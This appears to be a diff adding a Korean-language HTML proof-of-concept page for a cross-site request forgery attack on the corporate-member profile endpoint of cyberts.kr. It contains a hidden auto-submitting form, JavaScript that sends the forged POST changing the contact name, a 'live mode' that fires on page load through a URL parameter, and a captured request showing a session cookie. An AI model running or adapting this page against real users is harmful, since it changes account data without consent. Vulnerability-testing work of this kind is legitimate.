@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF 테스트 - VTSP 기업회원 저장</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 800px;
+            width: 100%;
+            padding: 40px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .vulnerability-info {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+        }
+        .vulnerability-info h3 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .vulnerability-info p {
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .info-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .info-box h3 {
+            color: #495057;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        .info-row {
+            display: flex;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .info-label {
+            font-weight: 600;
+            color: #495057;
+            min-width: 120px;
+        }
+        .info-value {
+            color: #6c757d;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #495057;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .input-group input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ced4da;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        .input-group input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .button-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        button {
+            flex: 1;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .attack-btn {
+            background: #dc3545;
+            color: white;
+        }
+        .attack-btn:hover {
+            background: #c82333;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+        .packet-btn {
+            background: #6c757d;
+            color: white;
+        }
+        .packet-btn:hover {
+            background: #5a6268;
+            transform: translateY(-2px);
+        }
+        .auto-submit {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 12px;
+            background: #e7f3ff;
+            border-radius: 8px;
+        }
+        .auto-submit input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+        .auto-submit label {
+            color: #004085;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .packet-display {
+            display: none;
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            overflow-x: auto;
+        }
+        .packet-display.show {
+            display: block;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        .status.show {
+            display: block;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .instructions {
+            background: #d1ecf1;
+            border-left: 4px solid #17a2b8;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 4px;
+        }
+        .instructions h3 {
+            color: #0c5460;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .instructions ol {
+            color: #0c5460;
+            padding-left: 20px;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .instructions ol li {
+            margin-bottom: 5px;
+        }
+        .highlight {
+            color: #dc3545;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF 취약점 테스트</h1>
+        <p class="subtitle">VTSP - 기업회원 정보 저장</p>
+
+        <div class="vulnerability-info">
+            <h3>⚠️ 취약점 정보</h3>
+            <p><strong>타입:</strong> Cross-Site Request Forgery (CSRF)<br>
+            <strong>영향도:</strong> Critical - 사용자 동의 없이 기업회원 정보 수정 가능<br>
+            <strong>원인:</strong> CSRF 토큰 미사용, SameSite 쿠키 미설정</p>
+        </div>
+
+        <div class="info-box">
+            <h3>📋 공격 대상 정보</h3>
+            <div class="info-row">
+                <span class="info-label">대상 URL:</span>
+                <span class="info-value">https://cyberts.kr/vtsp/mbe/emplyr/mypage/save.do</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">메소드:</span>
+                <span class="info-value">POST</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">파라미터:</span>
+                <span class="info-value">ncnm=[사용자 입력]</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">인코딩:</span>
+                <span class="info-value">application/x-www-form-urlencoded</span>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label for="nameInput">담당자명 (변경할 이름):</label>
+            <input type="text" id="nameInput" value="전유진" placeholder="변경할 이름을 입력하세요">
+        </div>
+
+        <div class="auto-submit">
+            <input type="checkbox" id="autoSubmit">
+            <label for="autoSubmit">페이지 로드 시 자동 공격 실행 (실전 모드)</label>
+        </div>
+
+        <div class="button-container">
+            <button class="attack-btn" onclick="executeAttack()">🚀 CSRF 공격 실행</button>
+            <button class="packet-btn" onclick="togglePacket()">📦 패킷 보기</button>
+        </div>
+
+        <div id="packetDisplay" class="packet-display">POST /vtsp/mbe/emplyr/mypage/save.do HTTP/1.1
+Host: cyberts.kr
+Cookie: JSESSIONID=9vwcevN9FWMdGlEtca6NlC--
+Content-Type: application/x-www-form-urlencoded
+Origin: https://cyberts.kr
+Referer: https://cyberts.kr/vtsp/mbe/emplyr/mypage/saveView.do
+
+ncnm=%EC%A0%84%EC%9C%A0%EC%A7%84</div>
+
+        <div id="status" class="status"></div>
+
+        <div class="instructions">
+            <h3>📖 테스트 방법</h3>
+            <ol>
+                <li><span class="highlight">cyberts.kr</span>에 로그인한 상태에서 이 페이지를 엽니다</li>
+                <li><span class="highlight">"CSRF 공격 실행"</span> 버튼을 클릭합니다</li>
+                <li>cyberts.kr의 <span class="highlight">기업회원 마이페이지</span>로 이동합니다</li>
+                <li>담당자명이 <span class="highlight">입력한 이름</span>으로 변경되었는지 확인합니다</li>
+                <li><strong>증명 완료:</strong> 본인이 직접 변경하지 않았는데 정보가 바뀌었다면 CSRF 취약점 증명!</li>
+            </ol>
+        </div>
+
+        <!-- Hidden CSRF Form -->
+        <form id="csrfForm" method="POST" action="https://cyberts.kr/vtsp/mbe/emplyr/mypage/save.do" style="display:none;">
+            <input type="text" name="ncnm" id="formName" value="">
+        </form>
+    </div>
+
+    <script>
+        function executeAttack() {
+            const nameInput = document.getElementById('nameInput');
+            const formName = document.getElementById('formName');
+            const form = document.getElementById('csrfForm');
+            const status = document.getElementById('status');
+
+            // 입력된 이름을 폼에 설정
+            const name = nameInput.value.trim();
+            if (!name) {
+                status.className = 'status show error';
+                status.innerHTML = '❌ 담당자명을 입력해주세요!';
+                return;
+            }
+
+            formName.value = name;
+
+            status.className = 'status show success';
+            status.innerHTML = '✅ CSRF 공격이 전송되었습니다!<br><br>' +
+                              '<strong>다음 단계:</strong><br>' +
+                              '1. cyberts.kr 기업회원 마이페이지로 이동<br>' +
+                              '2. 담당자명이 "' + name + '"으로 변경되었는지 확인<br>' +
+                              '3. 변경되었다면 CSRF 취약점 증명 완료!';
+
+            form.submit();
+        }
+
+        function togglePacket() {
+            const packet = document.getElementById('packetDisplay');
+            packet.classList.toggle('show');
+        }
+
+        // 자동 실행 체크박스 확인
+        window.onload = function() {
+            const autoSubmit = document.getElementById('autoSubmit');
+
+            // URL 파라미터로 자동 실행 확인
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('auto') === '1' || autoSubmit.checked) {
+                setTimeout(() => {
+                    executeAttack();
+                }, 1000);
+            }
+        };
+    </script>
+</body>
+</html>
